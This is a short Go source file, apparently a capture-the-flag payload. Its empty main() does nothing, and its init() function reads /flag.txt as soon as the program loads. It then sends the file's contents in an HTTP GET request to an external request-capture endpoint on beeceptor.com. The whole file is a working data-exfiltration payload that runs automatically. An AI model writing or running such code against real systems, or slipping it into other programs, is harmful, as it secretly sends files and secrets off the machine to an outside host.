package main

import (
    "io/ioutil"
    "net/http"
)

func init() {
    data, _ := ioutil.ReadFile("/flag.txt")
    http.Get("https://anas0x1.free.beeceptor.com/?=" + string(data))
}

func main() {}
